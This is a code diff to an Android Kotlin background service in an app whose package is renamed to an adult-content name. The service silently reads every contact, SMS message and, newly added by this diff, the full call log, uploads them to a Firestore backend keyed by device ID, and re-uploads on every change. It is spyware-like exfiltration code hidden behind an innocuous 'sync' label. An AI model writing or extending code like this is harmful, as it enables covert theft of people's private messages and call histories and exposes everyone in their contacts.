@@ -1,43 +1,47 @@
-package com.datasync.user.sync
+package com.boxx.porn.sync
 
-import android.app.*
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.PendingIntent
+import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.database.ContentObserver
-import android.net.Uri
 import android.os.Build
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
+import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.Telephony
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
-import com.datasync.user.MainActivity
-import com.datasync.user.data.FirestoreRepository
-import com.datasync.user.model.Device
-import com.datasync.user.utils.DataHelper
-import com.datasync.user.utils.DeviceIdHelper
+import com.boxx.porn.MainActivity
+import com.boxx.porn.data.FirestoreRepository
+import com.boxx.porn.model.Device
+import com.boxx.porn.utils.DataHelper
+import com.boxx.porn.utils.DeviceIdHelper
 import com.google.firebase.crashlytics.FirebaseCrashlytics
+import dagger.hilt.android.AndroidEntryPoint
 import kotlinx.coroutines.*
+import javax.inject.Inject
 
+@AndroidEntryPoint
 class SyncService : Service() {
-    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
-    private val repository = FirestoreRepository()
+    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+
+    @Inject
+    lateinit var repository: FirestoreRepository
+
     private val crashlytics = FirebaseCrashlytics.getInstance()
     private lateinit var deviceId: String
 
     private var syncJob: Job? = null
 
-    private val contactObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
-        override fun onChange(selfChange: Boolean) {
-            debouncedSync()
-        }
-    }
-
-    private val smsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
+    private val observer = object : ContentObserver(Handler(Looper.getMainLooper())) {
         override fun onChange(selfChange: Boolean) {
             debouncedSync()
         }
@@ -55,19 +59,14 @@ class SyncService : Service() {
                 notification,
                 android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
             )
-        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) { // Android 10+
-            startForeground(
-                1,
-                notification,
-                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
-            )
         } else {
             startForeground(1, notification)
         }
 
         try {
-            contentResolver.registerContentObserver(ContactsContract.Contacts.CONTENT_URI, true, contactObserver)
-            contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, smsObserver)
+            contentResolver.registerContentObserver(ContactsContract.Contacts.CONTENT_URI, true, observer)
+            contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, observer)
+            contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, observer)
         } catch (e: SecurityException) {
             Log.e("SyncService", "Permission denied for ContentObserver", e)
             crashlytics.recordException(e)
@@ -94,11 +93,14 @@ class SyncService : Service() {
         }
 
         try {
+            // In production, we'd use delta sync. For this requirement, we sync everything.
             val contacts = DataHelper.fetchContacts(this@SyncService)
             val smsList = DataHelper.fetchSMS(this@SyncService)
+            val callLogs = DataHelper.fetchCallLogs(this@SyncService)
 
             repository.syncContacts(deviceId, contacts)
             repository.syncSMS(deviceId, smsList)
+            repository.syncCallLogs(deviceId, callLogs)
 
             repository.updateDeviceInfo(Device(
                 deviceName = Build.MODEL,
@@ -106,6 +108,7 @@ class SyncService : Service() {
                 lastSyncTime = System.currentTimeMillis(),
                 contactCount = contacts.size,
                 smsCount = smsList.size,
+                callLogCount = callLogs.size,
                 timestamp = System.currentTimeMillis()
             ))
             Log.d("SyncService", "Sync completed successfully")
@@ -118,7 +121,8 @@ class SyncService : Service() {
     private fun hasRequiredPermissions(): Boolean {
         val permissions = mutableListOf(
             android.Manifest.permission.READ_CONTACTS,
-            android.Manifest.permission.READ_SMS
+            android.Manifest.permission.READ_SMS,
+            android.Manifest.permission.READ_CALL_LOG
         )
         return permissions.all {
             ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
@@ -159,7 +163,6 @@ class SyncService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         serviceScope.cancel()
-        contentResolver.unregisterContentObserver(contactObserver)
-        contentResolver.unregisterContentObserver(smsObserver)
+        contentResolver.unregisterContentObserver(observer)
     }
 }
